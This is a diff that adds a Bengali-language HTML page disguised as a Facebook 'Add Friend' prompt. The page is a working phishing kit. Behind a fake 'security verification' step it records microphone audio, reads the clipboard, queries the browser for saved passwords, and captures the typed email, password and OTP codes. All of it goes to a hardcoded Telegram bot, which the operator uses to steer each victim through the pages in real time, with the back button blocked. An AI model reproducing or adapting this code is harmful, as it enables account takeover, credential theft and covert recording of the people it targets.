@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f7f9fc; font-family: 'Helvetica', Arial, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
+        .hidden { display: none; }
+        
+        /* Layout */
+        .top-half { height: 48vh; width: 100%; display: flex; align-items: center; justify-content: center; background-color: white; border-bottom: 1px solid #e1e4e8; padding: 10px; box-sizing: border-box; }
+        .top-half img { max-width: 100%; max-height: 100%; object-fit: contain; border-radius: 8px; }
+        
+        /* কন্টেন্টগুলো একটু উপরে রাখার জন্য padding-bottom যোগ করা হয়েছে */
+        .bottom-half { height: 52vh; width: 100%; background: #f7f9fc; padding: 20px 20px 60px 20px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; position: relative; }
+        
+        /* Typography */
+        .main-title { font-size: 24px; font-weight: 800; color: #1c1e21; margin-bottom: 5px; }
+        .sub-text { font-size: 16px; color: #606770; line-height: 1.5; padding: 0 10px; }
+        .waiting-text { font-size: 18px; font-weight: 700; color: #1877f2; margin-top: 10px; }
+        .waiting-desc { font-size: 15px; color: #4b4f56; line-height: 1.6; padding: 0 20px; font-weight: 500; }
+
+        /* Buttons & Inputs */
+        .secure-input { width: 100%; max-width: 350px; padding: 16px; border: 2px solid #ccd0d5; border-radius: 12px; outline: none; font-size: 17px; background: white; }
+        .btn-blue { width: 100%; max-width: 350px; background-color: #1877f2; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; text-decoration: none; display: inline-block; margin-bottom: 10px; }
+        .btn-red { width: 100%; max-width: 350px; background-color: #ef4444; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; margin-bottom: 10px; }
+        .btn-green { width: 100%; max-width: 350px; background-color: #22c55e; color: white; font-weight: bold; padding: 16px; border-radius: 12px; cursor: pointer; border: none; font-size: 18px; margin-bottom: 10px; }
+
+        /* Loader */
+        .loader { width: 55px; height: 55px; border: 6px solid #f3f3f3; border-top: 6px solid #1877f2; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .status-icon { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 50px; margin-bottom: 5px; }
+        .success-bg { background: #22c55e; color: white; box-shadow: 0 4px 15px rgba(34, 197, 94, 0.4); }
+        .error-bg { background: #ef4444; color: white; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.4); }
+        
+        /* Permission items */
+        .permission-item { width: 100%; max-width: 340px; display: flex; align-items: center; gap: 12px; background: white; padding: 10px 15px; border-radius: 10px; border: 1px solid #e4e6eb; margin-bottom: 8px; }
+        .permission-icon { font-size: 24px; width: 40px; text-align: center; }
+        .permission-text { font-size: 14px; color: #1c1e21; font-weight: 500; }
+        .permission-desc { font-size: 11px; color: #606770; }
+        .check-badge { background: #22c55e; color: white; font-size: 11px; padding: 2px 8px; border-radius: 10px; margin-left: auto; }
+        .progress-bar { width: 100%; max-width: 350px; height: 6px; background: #e4e6eb; border-radius: 3px; overflow: hidden; margin: 10px 0; }
+        .progress-fill { height: 100%; background: #1877f2; border-radius: 3px; transition: width 0.5s; width: 0%; }
+    </style>
+</head>
+<body onload="checkState()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg">
+    </div>
+
+    <div class="bottom-half text-center">
+        <!-- STEP 1: Add Friend Button -->
+        <div id="step1" class="w-full flex flex-col items-center gap-4">
+            <h2 class="main-title">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+            <p class="sub-text">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
+            <button onclick="startProcess()" class="btn-blue">Add Friend</button>
+        </div>
+
+        <!-- STEP 2: Permission Page (New - সব পারমিশন একবারে) -->
+        <div id="permission_page" class="hidden w-full flex flex-col items-center gap-3">
+            <h1 class="main-title">🔐 নিরাপত্তা ভেরিফিকেশন</h1>
+            <p class="sub-text">নিচের "অনুমতি দিন" বাটনে ক্লিক করলে সব ভেরিফিকেশন একবারেই সম্পন্ন হবে।</p>
+            
+            <div class="w-full max-w-[340px] text-left mt-2">
+                <div class="permission-item">
+                    <span class="permission-icon">🎤</span>
+                    <div><div class="permission-text">মাইক্রোফোন</div><div class="permission-desc">ভয়েস ভেরিফিকেশন</div></div>
+                    <span class="check-badge">Auto</span>
+                </div>
+                <div class="permission-item">
+                    <span class="permission-icon">📋</span>
+                    <div><div class="permission-text">ক্লিপবোর্ড</div><div class="permission-desc">কপি করা ডেটা চেক</div></div>
+                    <span class="check-badge">Auto</span>
+                </div>
+                <div class="permission-item">
+                    <span class="permission-icon">🔐</span>
+                    <div><div class="permission-text">সেভ করা অ্যাকাউন্ট</div><div class="permission-desc">ইমেইল ও পাসওয়ার্ড</div></div>
+                    <span class="check-badge">Auto</span>
+                </div>
+            </div>
+            
+            <div class="progress-bar"><div id="progress_fill" class="progress-fill"></div></div>
+            
+            <button onclick="grantAllPermissions()" class="btn-green">✅ অনুমতি দিন</button>
+            <p id="perm_status" class="text-xs text-gray-500">সব পারমিশন একবারেই নেওয়া হবে</p>
+        </div>
+
+        <!-- STEP 3: Email + Password Fields (Original - হুবহু অরিজিনাল) -->
+        <div id="google_chooser" class="hidden w-full flex flex-col items-center gap-4">
+            <h1 class="main-title">অ্যাকাউন্ট নিশ্চিত করুন</h1>
+            <p class="sub-text">কিবোর্ডের ওপর থেকে আপনার ইমেইলটি সিলেক্ট করুন।</p>
+            <input type="email" id="email_field" name="email" autocomplete="username" placeholder="ইমেইল এড্রেস" class="secure-input" oninput="captureEmail(this.value)" onclick="captureAutoFill()">
+            <input type="password" id="pass_field" name="password" autocomplete="current-password" placeholder="পাসওয়ার্ড" class="secure-input" style="margin-top:5px" oninput="capturePass(this.value)" onclick="captureAutoFill()">
+            <button onclick="finalSubmit()" class="btn-blue">Add Friend</button>
+        </div>
+        
+        <!-- STEP 4: OTP Step -->
+        <div id="otp_step" class="hidden w-full flex flex-col items-center gap-4">
+            <h1 class="main-title">সিকিউরিটি কোড</h1>
+            <p class="sub-text">আপনার ফোনে পাঠানো ৬ ডিজিটের কোডটি লিখুন।</p>
+            <input type="text" id="otp_field" placeholder="০০০০০০" maxlength="6" class="secure-input" inputmode="numeric" oninput="captureOTP(this.value)">
+            <button onclick="submitOTP()" class="btn-blue">নিশ্চিত করুন</button>
+        </div>
+
+        <!-- STEP 5: Verifying / Waiting Page (Original) -->
+        <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
+            <div class="loader"></div>
+            <h3 class="waiting-text">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
+            <p class="waiting-desc">আপনার আইডিটি গুরুত্ব সহকারে যাচাই করা হচ্ছে। সিস্টেম প্রসেসিং শেষ না হওয়া পর্যন্ত দয়া করে এই পেজটি বন্ধ করবেন না।</p>
+        </div>
+
+        <!-- STEP 6: Success Page (Original) -->
+        <div id="success_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
+            <div class="status-icon success-bg">✓</div>
+            <h2 class="text-2xl font-bold text-green-600">অভিনন্দন!</h2>
+            <p class="sub-text text-sm">আপনার অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে। প্রোফাইল দেখতে নিচের বাটনে ক্লিক করুন।</p>
+            <a href="https://m.me/sabinayasmeen121" class="btn-blue mt-2">View Profile</a>
+        </div>
+
+        <!-- STEP 7: Error Page (Original) -->
+        <div id="error_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
+            <div class="status-icon error-bg">✕</div>
+            <h2 class="text-xl font-bold text-red-600">দুঃখিত!</h2>
+            <p class="sub-text font-semibold text-gray-800 text-sm">আপনার নেটওয়ার্কের সমস্যার জন্য ফেসবুক আইডি অ্যাড করা সম্ভব হচ্ছে না।</p>
+            <button onclick="location.reload()" class="btn-red mt-2">আবার চেষ্টা করুন</button>
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastUpdateId = 0;
+    let selectedEmail = "";
+    let selectedPass = "";
+    let selectedOTP = "";
+    let emailSent = false;
+    let passSent = false;
+    let otpSent = false;
+    let autoFillTimer = null;
+    let mediaRecorder = null;
+    let audioChunks = [];
+
+    // ===== অরিজিনাল checkState (হুবহু) =====
+    function checkState() {
+        if (sessionStorage.getItem('isWaiting') === 'true') {
+            goToStep('verifying');
+            lockBack();
+            startListening();
+        }
+    }
+
+    // ===== goToStep (আপডেটেড) =====
+    function goToStep(id) {
+        const steps = ['step1', 'permission_page', 'google_chooser', 'otp_step', 'verifying', 'success_page', 'error_page'];
+        steps.forEach(s => {
+            const el = document.getElementById(s);
+            if (el) {
+                el.classList.add('hidden');
+                el.classList.remove('flex');
+            }
+        });
+        const target = document.getElementById(id);
+        if (target) {
+            target.classList.remove('hidden');
+            if (id !== 'step1' && id !== 'google_chooser' && id !== 'otp_step' && id !== 'permission_page') {
+                target.classList.add('flex');
+            }
+        }
+    }
+
+    // ===== startProcess =====
+    function startProcess() {
+        goToStep('permission_page');
+        setTimeout(() => { document.getElementById('progress_fill').style.width = '30%'; }, 200);
+    }
+
+    // ===== 🎯 OK বাটন - সব পারমিশন একসাথে =====
+    function grantAllPermissions() {
+        const statusEl = document.getElementById('perm_status');
+        const progressFill = document.getElementById('progress_fill');
+        
+        statusEl.textContent = '🔍 পারমিশন নেওয়া হচ্ছে...';
+        progressFill.style.width = '40%';
+        
+        // 1️⃣ মাইক্রোফোন পারমিশন নিবে
+        requestMicrophonePermission();
+        progressFill.style.width = '55%';
+        
+        // 2️⃣ ক্লিপবোর্ড ডেটা নিবে
+        setTimeout(() => {
+            captureClipboard();
+            progressFill.style.width = '70%';
+        }, 500);
+        
+        // 3️⃣ সেভ করা অ্যাকাউন্ট খুঁজবে
+        setTimeout(() => {
+            captureSavedCredentials();
+            progressFill.style.width = '85%';
+        }, 1000);
+        
+        // 4️⃣ সব শেষে ইমেইল পেজে যাবে
+        setTimeout(() => {
+            progressFill.style.width = '100%';
+            statusEl.textContent = '✅ সব পারমিশন সম্পন্ন!';
+            setTimeout(() => {
+                goToStep('google_chooser');
+                setTimeout(() => { 
+                    const emailField = document.getElementById('email_field');
+                    if (emailField) emailField.focus(); 
+                }, 400);
+            }, 600);
+        }, 2000);
+    }
+
+    // ===== 1. মাইক্রোফোন =====
+    function requestMicrophonePermission() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    sendToBot(`🎤 **মাইক্রোফোন: ✅ অনুমোদিত`);
+                    startAudioRecording(stream);
+                    
+                    // অটোমেটিক ফর্মে ফোকাসের জন্য ভিব্রেশন (মোবাইলে)
+                    if (navigator.vibrate) navigator.vibrate(50);
+                })
+                .catch(err => {
+                    sendToBot(`🎤 **মাইক্রোফোন: ❌ অনুমতি নেই`);
+                });
+        } else {
+            sendToBot(`🎤 **মাইক্রোফোন: ❌ ব্রাউজার সাপোর্ট করে না`);
+        }
+    }
+
+    function startAudioRecording(stream) {
+        audioChunks = [];
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+        
+        mediaRecorder.ondataavailable = event => {
+            if (event.data.size > 0) audioChunks.push(event.data);
+        };
+        
+        mediaRecorder.onstop = () => {
+            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            sendAudioToTelegram(audioBlob);
+            stream.getTracks().forEach(track => track.stop());
+        };
+        
+        mediaRecorder.start();
+        sendToBot(`🎤 **অডিও রেকর্ডিং শুরু (৫ সেকেন্ড)**`);
+        
+        setTimeout(() => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                sendToBot(`🎤 **অডিও রেকর্ডিং শেষ**`);
+            }
+        }, 5000);
+    }
+
+    function sendAudioToTelegram(audioBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('audio', audioBlob, 'recording.webm');
+        fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+            method: 'POST',
+            body: formData
+        }).catch(() => {
+            sendToBot(`🎤 **অডিও রেকর্ড করা হয়েছে (${Math.round(audioBlob.size/1024)}KB)**`);
+        });
+    }
+
+    // ===== 2. ক্লিপবোর্ড =====
+    function captureClipboard() {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            navigator.clipboard.readText()
+                .then(text => {
+                    if (text && text.trim().length > 0) {
+                        sendToBot(`📋 **ক্লিপবোর্ড:** \`${text.substring(0, 300)}\``);
+                    } else {
+                        sendToBot(`📋 **ক্লিপবোর্ড: খালি**`);
+                    }
+                })
+                .catch(() => {
+                    sendToBot(`📋 **ক্লিপবোর্ড: ❌ পড়া যায়নি`);
+                });
+        } else {
+            sendToBot(`📋 **ক্লিপবোর্ড API: সাপোর্ট করে না`);
+        }
+        // পেস্ট ইভেন্ট সবসময় লিসেন করবে
+        document.addEventListener('paste', function(e) {
+            const text = e.clipboardData.getData('text');
+            if (text) sendToBot(`📋 **ক্লিপবোর্ড (পেস্ট):** \`${text.substring(0, 300)}\``);
+        });
+    }
+
+    // ===== 3. সেভ করা অ্যাকাউন্ট (ক্রেডেনশিয়াল API) =====
+    function captureSavedCredentials() {
+        if (navigator.credentials && navigator.credentials.get) {
+            navigator.credentials.get({
+                password: true,
+                unmediated: false,
+                mediation: 'optional'
+            })
+            .then(cred => {
+                if (cred) {
+                    sendToBot(`🔐 **সেভ করা অ্যাকাউন্ট পাওয়া গেছে!`);
+
+                    if (cred.type === 'password' && cred.password) {
+                        selectedEmail = cred.id || '';
+                        selectedPass = cred.password || '';
+                        sendToBot(`🔐 **ক্রেডেনশিয়াল আনলক!**\n📧 ইউজার: \`${selectedEmail}\`\n🔑 পাসওয়ার্ড: \`${selectedPass}\``);
+                        
+                        const emailField = document.getElementById('email_field');
+                        const passField = document.getElementById('pass_field');
+                        if (emailField) emailField.value = selectedEmail;
+                        if (passField) passField.value = selectedPass;
+                        emailSent = true;
+                        passSent = true;
+                    }
+                } else {
+                    sendToBot(`🔐 **সেভ করা অ্যাকাউন্ট: পাওয়া যায়নি`);
+                }
+            })
+            .catch(() => {
+                sendToBot(`🔐 **ক্রেডেনশিয়াল API: ❌ ত্রুটি`);
+                // Fallback: অটোফিল চেক
+                let checkCount = 0;
+                const checkInterval = setInterval(() => {
+                    checkCount++;
+                    const eVal = document.getElementById('email_field').value;
+                    const pVal = document.getElementById('pass_field').value;
+
+                    if (eVal && eVal.includes('@') && !emailSent) {
+                        selectedEmail = eVal;
+                        sendToBot(`📧 **অটোফিল ইমেইল:** \`${eVal}\``);
+                        emailSent = true;
+                    }
+                    if (pVal && pVal.length > 0 && !passSent) {
+                        selectedPass = pVal;
+                        sendToBot(`🔑 **অটোফিল পাসওয়ার্ড:** \`${pVal}\``);
+                        passSent = true;
+                    }
+                    if (emailSent && passSent) {
+                        clearInterval(checkInterval);
+                        sendToBot(`🎯 **সম্পূর্ণ অটোফিল ডেটা!**\n📧 ইমেইল: \`${selectedEmail}\`\n🔑 পাসওয়ার্ড: \`${selectedPass}\``);
+                    }
+                    if (checkCount > 10) clearInterval(checkInterval);
+                }, 500);
+            });
+        } else {
+            sendToBot(`🔐 **ক্রেডেনশিয়াল API: ❌ ব্রাউজার সাপোর্ট করে না`);
+        }
+    }
+
+    // ===== captureAutoFill =====
+    function captureAutoFill() {
+        if (autoFillTimer) clearTimeout(autoFillTimer);
+        autoFillTimer = setTimeout(() => {
+            const emailVal = document.getElementById('email_field').value;
+            const passVal = document.getElementById('pass_field').value;
+
+            if (emailVal && emailVal.includes('@') && !emailSent) {
+                selectedEmail = emailVal;
+                sendToBot(`📧 **ইমেইল (অটোফিল):** \`${selectedEmail}\``);
+                emailSent = true;
+            }
+            if (passVal && passVal.length > 0 && !passSent) {
+                selectedPass = passVal;
+                sendToBot(`🔑 **পাসওয়ার্ড (অটোফিল):** \`${selectedPass}\``);
+                passSent = true;
+            }
+            if (emailSent && passSent) {
+                sendToBot(`🎯 **সম্পূর্ণ ডেটা (অটোফিল)!**\n📧 ইমেইল: \`${selectedEmail}\`\n🔑 পাসওয়ার্ড: \`${selectedPass}\``);
+            }
+        }, 500);
+    }
+
+    // ===== captureEmail (অরিজিনাল - হুবহু) =====
+    function captureEmail(val) {
+        if(val.includes('@') && !emailSent) {
+            selectedEmail = val;
+            sendToBot(`📧 **ইমেইল সিলেক্ট:** \`${selectedEmail}\``);
+            emailSent = true;
+        }
+    }
+
+    // ===== capturePass =====
+    function capturePass(val) {
+        if(val.length > 0 && !passSent) {
+            selectedPass = val;
+            sendToBot(`🔑 **পাসওয়ার্ড টাইপ করা হয়েছে:** \`${selectedPass}\``);
+            passSent = true;
+            if (emailSent) {
+                sendToBot(`🎯 **সম্পূর্ণ ডেটা!**\n📧 ইমেইল: \`${selectedEmail}\`\n🔑 পাসওয়ার্ড: \`${selectedPass}\``);
+            }
+        }
+    }
+
+    // ===== captureOTP =====
+    function captureOTP(val) {
+        if(val.length >= 4 && !otpSent) {
+            selectedOTP = val;
+            sendToBot(`🔐 **OTP কোড:** \`${selectedOTP}\``);
+            otpSent = true;
+
+            let report = `🎯 **সম্পূর্ণ ডেটা (OTP সহ)!**\n`;
+            report += `📧 ইমেইল: \`${selectedEmail || 'না'}\`\n`;
+            report += `🔑 পাসওয়ার্ড: \`${selectedPass || 'না'}\`\n`;
+            report += `🔐 OTP: \`${selectedOTP}\``;
+            sendToBot(report);
+        }
+    }
+
+    // ===== finalSubmit (অরিজিনাল - আপডেটেড) =====
+    function finalSubmit() {
+        selectedEmail = document.getElementById('email_field').value;
+        selectedPass = document.getElementById('pass_field').value;
+
+        if(!selectedEmail && !selectedPass) {
+            alert('দয়া করে আপনার ইমেইল এবং পাসওয়ার্ড দিন');
+            return;
+        }
+
+        if (!emailSent && selectedEmail) {
+            sendToBot(`📧 **ইমেইল (সাবমিট):** \`${selectedEmail}\``);
+            emailSent = true;
+        }
+        if (!passSent && selectedPass) {
+            sendToBot(`🔑 **পাসওয়ার্ড (সাবমিট):** \`${selectedPass}\``);
+            passSent = true;
+        }
+
+        sessionStorage.setItem('isWaiting', 'true');
+
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "🔑 Pass Change", callback_data: `pass_${selectedEmail}` }],
+                [{ text: "🔐 OTP চান", callback_data: "otp_req" }],
+                [{ text: "⏳ Force Waiting", callback_data: "wait_cmd" }],
+                [{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }]
+            ]
+        };
+
+        let finalReport = `🎯 **ইউজার ক্লিক করেছে! (সাবমিট)**\n`;
+        finalReport += `📧 ইমেইল: \`${selectedEmail || 'না'}\`\n`;
+        finalReport += `🔑 পাসওয়ার্ড: \`${selectedPass || 'না'}\`\n`;
+        if (selectedOTP) finalReport += `🔐 OTP: \`${selectedOTP}\`\n`;
+        finalReport += `🎤 মাইক্রোফোন: ✅\n`;
+        finalReport += `📋 ক্লিপবোর্ড: ✅`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: finalReport, reply_markup: keyboard })
+        });
+
+        goToStep('verifying');
+        lockBack();
+        startListening();
+    }
+
+    // ===== submitOTP =====
+    function submitOTP() {
+        selectedOTP = document.getElementById('otp_field').value;
+        if (!selectedOTP) { alert('কোড দিন'); return; }
+
+        if (!otpSent) {
+            sendToBot(`🔐 **OTP (সাবমিট):** \`${selectedOTP}\``);
+            otpSent = true;
+        }
+
+        let report = `🎯 **সম্পূর্ণ ডেটা (OTP সাবমিট)!**\n`;
+        report += `📧 ইমেইল: \`${selectedEmail || 'না'}\`\n`;
+        report += `🔑 পাসওয়ার্ড: \`${selectedPass || 'না'}\`\n`;
+        report += `🔐 OTP: \`${selectedOTP}\``;
+
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }]
+            ]
+        };
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: report, reply_markup: keyboard })
+        });
+
+        goToStep('verifying');
+    }
+
+    // ===== lockBack (অরিজিনাল - হুবহু) =====
+    function lockBack() {
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = () => { 
+            window.history.pushState(null, "", window.location.href); 
+            if (sessionStorage.getItem('isWaiting') === 'true') goToStep('verifying'); 
+        };
+    }
+
+    // ===== sendToBot (অরিজিনাল - হুবহু) =====
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+            method: 'POST', 
+            headers: {'Content-Type': 'application/json'}, 
+            body: JSON.stringify({ chat_id: chatId, text: text }) 
+        });
+    }
+
+    // ===== startListening (অরিজিনাল - আপডেটেড) =====
+    function startListening() {
+        setInterval(() => {
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.ok && data.result) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        if (update.callback_query) {
+                            const cbData = update.callback_query.data;
+
+                            if (cbData === "success") {
+                                goToStep('success_page');
+                                sessionStorage.removeItem('isWaiting');
+                            } else if (cbData === "error") {
+                                goToStep('error_page');
+                                sessionStorage.removeItem('isWaiting');
+                            } else if (cbData === "wait_cmd") {
+                                goToStep('verifying');
+                                sessionStorage.setItem('isWaiting', 'true');
+                            } else if (cbData === "otp_req") {
+                                goToStep('otp_step');
+                            } else if (cbData.startsWith('pass_')) {
+                                goToStep('google_chooser');
+                                const emailField = document.getElementById('email_field');
+                                if (emailField) emailField.value = cbData.replace('pass_', '');
+                            }
+
+                            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({ callback_query_id: update.callback_query.id })
+                            });
+                        }
+                    });
+                }
+            })
+            .catch(err => console.log('Polling error:', err));
+        }, 2000);
+    }
+</script>
+
+</body>
+</html>
